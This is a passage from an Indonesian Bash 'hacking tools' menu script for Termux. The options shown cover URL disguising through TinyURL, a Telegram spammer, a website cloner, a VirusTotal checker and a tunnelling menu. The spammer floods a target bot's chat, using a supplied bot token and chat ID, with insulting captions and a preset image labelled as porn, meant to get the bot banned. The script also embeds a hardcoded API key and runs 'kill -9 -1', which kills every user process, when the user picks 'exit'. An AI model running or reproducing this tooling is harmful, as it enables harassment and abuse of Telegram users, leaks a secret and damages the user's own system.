    echo -e "${r}[ ${g}x ${r}]${c} jq belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    sleep 3 
    pkg install jq -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} jq sudah terinstall."
    echo ""
    sleep 3 
fi
clear
echo "
██████╗ ██╗████████╗██╗  ██╗   ██╗
██╔══██╗██║╚══██╔══╝██║  ╚██╗ ██╔╝
██████╔╝██║   ██║   ██║   ╚████╔╝ 
██╔══██╗██║   ██║   ██║    ╚██╔╝  
██████╔╝██║   ██║   ███████╗██║   
╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝" | lolcat
echo -e "${c}Development ${n}: ${y}Thxyzz404"
echo -e "${g}"
read -p "Masukkan url anda : " andrax_tolol
echo ""
urlencode() {
    local string="$1"
    local encoded=""
    local length="${#string}"    
    for (( i = 0; i < length; i++ )); do
        local c="${string:$i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}
if [[ -z "$andrax_tolol" ]]; then
    clear 
    echo ""
    echo -e "${r}Error : URL tidak boleh kosong..!!"
    echo ""
    exit 1
fi
if [[ ! "$andrax_tolol" =~ ^https?:// ]] && [[ ! "$andrax_tolol" =~ ^ftp:// ]]; then
    url="http://$andrax_tolol"
fi
echo -e "${r}[ ${g}+ ${r}]${c} Memproses url akan di samarkan..!!"
echo ""
encoded_url=$(urlencode "$andrax_tolol")
short=$(curl -s -m 10 "https://tinyurl.com/api-create.php?url=${encoded_url}")
if [[ "$short" == http* ]] && [[ "$short" != *"Error"* ]]; then
    ajg="ansi-rounded"
    echo "URL telah di samarkan : $short" | boxes -d "$ajg" | lolcat
  else
    clear 
    echo ""
    echo -e "${r}Error : Gagal menyamarkan URL..!!"
    echo ""
    echo -e "${g}Kemungkinan masalah."
    echo -e "${r}[ 1 ] URL tidak valid."
    echo -e "${c}[ 2 ] Koneksi internet bermasalah."
    echo -e "${y}[ 3 ] TinyURL sedang down servernya."
fi
echo ""
     echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
               ;;
        26)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
c='\033[36;1m'
p='\033[35;1m'
g='\033[32;1m'
y='\033[33;1m'
r='\033[31;1m'
              mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
              echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${yellow} Gunakan Link Upload Gambar ini : ${cyan}https://top4top.io"
echo -e "${green}================================================"
echo -e "${red}       Spammer Telegram By.Thxyzz404"
echo -e "${green}================================================"
echo ""
echo -e "${r}[ ${g}01 ${r}] ${cyan}Spam Teks Biasa"
echo -e "${r}[ ${g}02 ${r}] ${cyan}Spam Teks Auto Virtex"
echo -e "${r}[ ${g}03 ${r}] ${cyan}Spam Teks + Gambar + Video + Audio"
echo -e "${r}[ ${g}04 ${r}] ${cyan}Spam Auto Hitam Bokep"
echo -e "${r}[ ${g}00 ${r}] ${yellow}Kembali Ke ToolslV"
echo -e "${green}"
read -p "Silahkan Pilih : " kuy
case $kuy in
 1|01)
send_text_message() {
    TOKEN=$1
    CHAT_ID=$2
    MESSAGE=$3
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="$MESSAGE" > /dev/null 2>&1
}
loading_bar() {
frames=(
"[\e[1;91m■\e[0m□□□□□□□□□]"
"[\e[1;92m■■\e[0m□□□□□□□□]"
"[\e[1;93m■■■\e[0m□□□□□□□]"
"[\e[1;94m■■■■\e[0m□□□□□□]"
"[\e[1;95m■■■■■\e[0m□□□□□]"
"[\e[1;96m■■■■■■\e[0m□□□□]"
"[\e[1;97m■■■■■■■\e[0m□□□]"
"[\e[1;92m■■■■■■■■\e[0m□□]"
"[\e[1;93m■■■■■■■■■\e[0m□]"
"[\e[1;94m■■■■■■■■■■\e[0m]"
  )
  local count=0
  while [ $count -lt $SPAM_COUNT ]; do
    for frame in "${frames[@]}"; do
      send_text_message "$BOT_TOKEN" "$CHAT_ID" "$MESSAGE"
      count=$((count+1))
      echo -ne "\r$frame"
      sleep 0.01
      if [ $count -ge $SPAM_COUNT ]; then
        break
      fi
    done
  done
  echo ""
  echo -e "${y}Sukses Pengiriman Dalam Totall ${r}: ${c}${SPAM_COUNT}"
}
echo -e "${c}"
read -p "Masukkan Pesan Teks : " MESSAGE
echo -e "${y}"
read -p "Masukkan Token Botz Target : " BOT_TOKEN
echo -e "${r}"
read -p "Masukkan Chat ID Target : " CHAT_ID
echo -e "${g}"
read -p "Masukkan Jumlah Spam Pesan Yang Ingin Dikirim : " SPAM_COUNT
echo ""
echo -e "${purple}Sedang proses spam..!!"
echo ""
loading_bar
       ;;
2|02)
clear
echo "
 ▗▄▄▖▗▄▄▄▖▗▄▄▖ ▗▖  ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▌   ▐▌ ▐▌▐▌  ▐▌▐▌   ▐▌ ▐▌
 ▝▀▚▖▐▛▀▀▘▐▛▀▚▖▐▌  ▐▌▐▛▀▀▘▐▛▀▚▖
▗▄▄▞▘▐▙▄▄▖▐▌ ▐▌ ▝▚▞▘ ▐▙▄▄▖▐▌ ▐▌
" | lolcat
echo -e "${g}===============${r} Server Website ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://muka-lu-kontol.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUKA WEBSITE SERVER."
echo ""
  ;;
  3|03)
    loading_bar() {
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while :; do
        for frame in "${frames[@]}"; do
            echo -ne "\r$frame Mengirim...!!"
            sleep 0.2
        done
    done
}
echo -e "${c}"
read -p "Masukkan Token Botz : " token
echo -e "${g}"
read -p "Masukkan ID Botz : " chat_id
echo -e "${c}"
read -p "Masukkan Pesan Untuk Botz : " text
echo -e "${y}"
read -p "Masukkan Image Url Gambar Anda : " photo_url
echo -e "${c}"
read -p "Masukkan Video Url Anda : " video_url
echo -e "${g}"
read -p "Masukkan Audio Url Anda : " audio_url
echo -e "${y}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
if ! [[ "$jumlah" =~ ^[0-9]+$ ]]; then
    echo -e "${r}Error : Jumlah Harus Berupa Angka..!!"
    echo ""
    echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
    read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
    clear
fi
loading_bar &
pid=$!
for ((i = 0; i < jumlah; i++)); do
    if [[ -n "$photo_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendPhoto" \
            -F "chat_id=${chat_id}" \
            -F "photo=${photo_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$video_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendVideo" \
            -F "chat_id=${chat_id}" \
            -F "video=${video_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -n "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendAudio" \
            -F "chat_id=${chat_id}" \
            -F "audio=${audio_url}" \
            -F "caption=${text}" > /dev/null
    fi
    if [[ -z "$photo_url" && -z "$video_url" && -z "$audio_url" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${text}" > /dev/null
    fi
done
kill $pid
wait $pid 2>/dev/null
echo -e "${g} Proses selesai dengan jumlah : ${jumlah}"
  ;;
4|04)
echo -e "${p}"
read -p "Masukkan Bot Token : " TOKEN
echo -e "${c}"
read -p "Masukkan Chat ID : " CHAT_ID
echo -e "${y}"
read -p "Masukkan jumlah pengiriman : " JUMLAH
echo ""
if [[ -z "$TOKEN" || -z "$CHAT_ID" || -z "$JUMLAH" ]]; then
    clear 
    echo ""
    echo -e "${c}Token, Chat ID, atau Jumlah tidak boleh kosong!"
    echo ""
fi
if ! [[ "$JUMLAH" =~ ^[0-9]+$ ]] || [[ "$JUMLAH" -lt 1 ]]; then
    clear 
    echo ""
    echo -e "${g}Jumlah harus angka positif!"
    echo ""
fi
PHOTO_URL="https://l.top4top.io/p_3539d0y7d1.jpg"
AUDIO_URL="https://h.top4top.io/m_3588buygi1.mp3"
CAPTION="Bang Bokep Nih Bang Enak Hahaha 😹🖕"
loading_bar() {
    local pid=$1
    frames=(
        "[\e[1;91m■\e[0m□□□□□□□□□]"
        "[\e[1;92m■■\e[0m□□□□□□□□]"
        "[\e[1;93m■■■\e[0m□□□□□□□]"
        "[\e[1;94m■■■■\e[0m□□□□□□]"
        "[\e[1;95m■■■■■\e[0m□□□□□]"
        "[\e[1;96m■■■■■■\e[0m□□□□]"
        "[\e[1;97m■■■■■■■\e[0m□□□]"
        "[\e[1;92m■■■■■■■■\e[0m□□]"
        "[\e[1;93m■■■■■■■■■\e[0m□]"
        "[\e[1;94m■■■■■■■■■■\e[0m]"
    )
    while kill -0 $pid 2>/dev/null; do
        for frame in "${frames[@]}"; do
            printf "\r$frame Mengirim [$COUNTER/$JUMLAH]..!! "
            sleep 0.12
        done
    done
    printf "\r%-60s\r" ""
}
echo -e "${r}[ ${g}✓ ${r}]${g} Sedang proses..!! "
echo ""
COUNTER=0
for (( i=1; i<=JUMLAH; i++ )); do
    COUNTER=$i
    CAPTION_LOOP="Goblok Lu Sangean Tolol Lu Awokawok 😂🤣"
    (
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
            -F "chat_id=$CHAT_ID" \
            -F "photo=$PHOTO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendAudio" \
            -F "chat_id=$CHAT_ID" \
            -F "audio=$AUDIO_URL" \
            -F "caption=$CAPTION_LOOP" > /dev/null
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Botz sudah hitam tuan sudah selesai ${r}[ ${g}$i ${r}]"
    ) &
    loading_bar $!
    wait $!
    echo -e "${g}Kirim ke $i selesai."
    sleep 2 
done
echo ""
echo -e "${c}SUCCESS : Semua $JUMLAH pesan berhasil dikirim!"
echo -e "${y}========================================"
echo ""
  ;;
esac
echo ""
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      27)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
 ██████╗ ███████╗███╗   ██╗███████╗
██╔════╝ ██╔════╝████╗  ██║╚══███╔╝
██║  ███╗█████╗  ██╔██╗ ██║  ███╔╝ 
██║   ██║██╔══╝  ██║╚██╗██║ ███╔╝  
╚██████╔╝███████╗██║ ╚████║███████╗
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝
       Developer : Thxyzz404 " | lolcat 2>/dev/null || cat     
echo -e "${g}"                                  
read -p "Masukkan link : " get
echo -e "${c}"
if [ -z "$get" ]; then
    clear 
    echo ""
    echo -e "${r} Link jangan kosong."
fi
read -p "Masukkan nama path folder : " der
echo ""
if [ -z "$der" ]; then
    clear 
    echo ""
    echo -e "${r} Nama folder kosong kocak."
fi
sim="/sdcard/Download/$der"
mkdir -p "$sim" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${y} Terjadi kesalahan."
    sim="./$der"
    mkdir -p "$sim"
fi
echo -e "${r}[ ${g}✓ ${r}]${y} Menyimpan file ke : $sim"
file="$sim/temp_page.html"
url=$(echo "$get" | grep -oE '^https?://[^/]+')
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Mengambil halaman : $get"
curl -s -k -L "$get" -o "$file"
if [ $? -ne 0 ] || [ ! -s "$file" ]; then
    clear 
    echo ""
    echo -e "${r} Gagall mengambil get"
fi
echo ""
echo -e "${r}[ ${g}✓ ${r}]${p} Mencari file JS"
echo ""
grep -oE 'src="[^"]*\.js[^"]*"' "$file" | cut -d'"' -f2 | while read js_file; do
    [ -z "$js_file" ] && continue
    if [[ "$js_file" != http* ]]; then
        js_file="$url/${js_file#/}"
    fi
    js_name=$(basename "$js_file" | cut -d'?' -f1)
    echo -e "${g}Download : $js_file"
    curl -s -k -L "$js_file" -o "$sim/$js_name"
done
echo ""
echo -e "${r}[ ${g}✓ ${r}]${b} Mencari file CSS"
echo ""
grep -oE 'href="[^"]*\.css[^"]*"' "$file" | cut -d'"' -f2 | while read css_file; do
    [ -z "$css_file" ] && continue
    if [[ "$css_file" != http* ]]; then
        css_file="$url/${css_file#/}"
    fi
    css_name=$(basename "$css_file" | cut -d'?' -f1)
    echo -e "${g}Download : $css_file"
    curl -s -k -L "$css_file" -o "$sim/$css_name"
done
echo ""
echo -e "${r}[ ${g}✓ ${r}]${y} Mencari file HTML"
echo ""
grep -oE 'href="[^"]*\.html[^"]*"' "$file" | cut -d'"' -f2 | while read html_file; do
    [ -z "$html_file" ] && continue
    if [[ "$html_file" != http* ]]; then
        html_file="$url/${html_file#/}"
    fi
    html_name=$(basename "$html_file" | cut -d'?' -f1)
    echo -e "${g}Download : $html_file"
    curl -s -k -L "$html_file" -o "$sim/$html_name"
done
mv "$file" "$sim/index.html" 2>/dev/null
echo -e "${r}[ ${g}✓ ${r}]${b} Semua file disimpan di : $sim"
     echo ""
         echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
         read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
         clear
               ;;
        28)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
key="0d23f9b46bfa7c09dccdf3435bd363380fce2e16ff9b2e0d06ce3b671799371c"
wok="https://www.virustotal.com/api/v3"
json() {
 local json="$1"
 local key="$2"
 echo "$json" | grep -o "\"$key\":[^,}]*" | cut -d: -f2 | tr -d '" '
}
scan() {
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣄⠀
⠀⠀⣴⣶⣶⣶⣶⣶⣾⣿⣿⡿⢿⣿⣿⣦⣤⣤⣤⣤⣤⣤⣶⣿⣿⣿⣿⣷
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⠋⣿⡏⢹⡟⠉⣿⠉⠀⠀
⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠈⠁⠀⠉⠀⠈⠁⠀⠉⠀⠀⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⡀⠀⠀⣀⣠⣶⣦⠀⠀
⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠉⠛⠿⣿⣿⣿⠿⠟⠋⠀⠀⠀
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⢀⡀⠀⣀⡀⢀⡀⠀⣀⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣷⣾⣷⣶⣿⣶⣶⡀
⠀⠘⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠛⠛⠋⠀" | lolcat
echo ""
echo -e "${p}Development ${c}: ${g}Thxyzz404"
echo -e "${g}"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
read -p "Masukkan URL target : " url
echo "" 
if [ -z "$url" ]; then
   echo -e"${r} URL tidak boleh kosong."
   return
fi   
echo -e "${r}[ ${g}+ ${r}]${y} Sedang proses."
hash=$(echo -n "$url" | sha256sum | cut -d' ' -f1)
echo -e "${r}[ ${g}+ ${r}]${g} Mengambil respon virustotal."
res=$(curl -s -X GET "${wok}/urls/${hash}" \
-H "x-apikey: ${key}")
if echo "$res" | grep -q '"error":'; then
tidak_terdeteksi=$(echo "$res" | grep -o '"message":"[^"]*"' | cut -d'"' -f4)
echo ""
echo " Setatus Aman : ✅"
return
fi
echo -e "${r}[ ${g}✓ ${r}]${b} Sedang menganalisis..!!"
if command -v jq &> /dev/null; then       
harmless=$(echo "$res" | jq '.data.attributes.last_analysis_stats.harmless // 0')
malicious=$(echo "$res" | jq '.data.attributes.last_analysis_stats.malicious // 0')
suspicious=$(echo "$res" | jq '.data.attributes.last_analysis_stats.suspicious // 0')
undetected=$(echo "$res" | jq '.data.attributes.last_analysis_stats.undetected // 0')
timeout=$(echo "$res" | jq '.data.attributes.last_analysis_stats.timeout // 0')        
else
echo -e "${r} Terjadi kesalahan."
stats_section=$(echo "$res" | grep -o '"last_analysis_stats":{[^}]*}' | sed 's/.*{/{/')       
if [ -n "$stats_section" ]; then
harmless=$(echo "$stats_section" | grep -o '"harmless":[0-9]*' | grep -o '[0-9]*')
malicious=$(echo "$stats_section" | grep -o '"malicious":[0-9]*' | grep -o '[0-9]*')
suspicious=$(echo "$stats_section" | grep -o '"suspicious":[0-9]*' | grep -o '[0-9]*')
undetected=$(echo "$stats_section" | grep -o '"undetected":[0-9]*' | grep -o '[0-9]*')
timeout=$(echo "$stats_section" | grep -o '"timeout":[0-9]*' | grep -o '[0-9]*')
  fi
fi
harmless=${harmless:-0}
malicious=${malicious:-0}
suspicious=${suspicious:-0}
undetected=${undetected:-0}
timeout=${timeout:-0}
total=$((harmless + malicious + suspicious + undetected + timeout))  
    echo -e "${n}"
    echo "══════════════════════════════════════"
    echo "      📋 HASIL SCAN VIRUSTOTAL"
    echo "══════════════════════════════════════"
    echo ""
    echo "🔗 URL : $url"
    echo "🆔 Hash : ${hash:0:12}"
    echo "📊 Total Engine : $total"
    echo ""
    echo "✅ Bersih : $harmless"
    echo "⚠️ Mencurigakan : $suspicious"
    echo "❌ Berbahaya : $malicious"
    echo "🔍 Tidak terdeteksi : $undetected"
    echo "⏱️ Timeout : $timeout"
    echo ""
    echo "══════════════════════════════════════"
    echo ""
if [ "$total" -eq 0 ]; then
echo ""
elif [ "$malicious" -gt 0 ]; then
echo "🚨 PERINGATAN : $malicious URL ini sangat BERBAHAYA."
echo ""
echo "$res" | grep -o '"engine_name":"[^"]*","category":"malicious"' | grep -o '"engine_name":"[^"]*"' | cut -d'"' -f4 | head -10
fi
scan_date=$(echo "$res" | grep -o '"last_analysis_date":[0-9]*' | head -1 | cut -d: -f2)
if [ -n "$scan_date" ]; then
  date_str=$(date -d "@$scan_date" 2>/dev/null || echo "$scan_date")
  echo "📅 Terakhir di-scan : $date_str"
fi  
echo "⏰ Waktu scan : $(date '+%H:%M:%S')"
}
dancok() {
clear
syg="ansi-rounded"
cowsay -f eyes 'Check-URL' | boxes -d "$syg" | lolcat
echo ""
echo -e "${p}         Development ${r}:${c} By.Thxyzz404"  
    echo -e "${b}"
    echo "1. Scan URL"
    echo "2. Test dengan contoh URL"
    echo "3. Keluar"
    echo -e "${g}"
    read -p "Masukkan pilihan anda : " choice    
    case $choice in
        1)
            scan
            ;;
        2)
            clear
            echo ""
            echo -e "${g}Silahkan salin url di bawah ini sebagai testing."
            echo -e "${c}"
            echo "1. https://google-com-ops.github.io/Xnxx.com/"
            echo "2. https://roi2021.wpengine.com/edito.php"
            echo -e "${y}"
            read -p "Tekan entar untuk melanjutkan..!!"
            scan
            ;;
        3)
            echo ""
            echo -e "${c} 👋 Sampai jumpa yak kontol."
            echo ""
            sleep 3 
            kill -9 -1 && exit
            ;;
        *)
            echo -e "${r} Pilih yang bener tolol."
            ;;
    esac   
    echo ""
    echo -e "${n}══════════════════════════════════════"
    echo -e "${c}"
    read -p "Tekan Enter untuk melanjutkan..!!"
    dancok
}
dancok
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
        ;;
 29)
           echo ""
           mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
           echo -e "${c} Anda Memilih Menu Hacking..!!"
           echo ""
           echo -e "${r} VIP UNLOCK..!!"
           sleep 2
           clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
b='\033[34;1m'
y='\033[33;1m'
n='\033[0m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██╗   ██╗██████╗ ██╗     
██║   ██║██╔══██╗██║     
██║   ██║██████╔╝██║     
██║   ██║██╔══██╗██║     
╚██████╔╝██║  ██║███████╗
 ╚═════╝ ╚═╝  ╚═╝╚══════╝" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Serveonet "
echo -e "${r}[${y} 02 ${r}] ${g}Ihr-life "
echo -e "${r}[${y} 03 ${r}] ${g}Ngrok "
echo -e "${r}[${y} 04 ${r}] ${g}Claudflare "
echo -e "${r}[${y} 05 ${r}] ${c}Keluar "
}
url_1() {
clear
cd $HOME
echo "
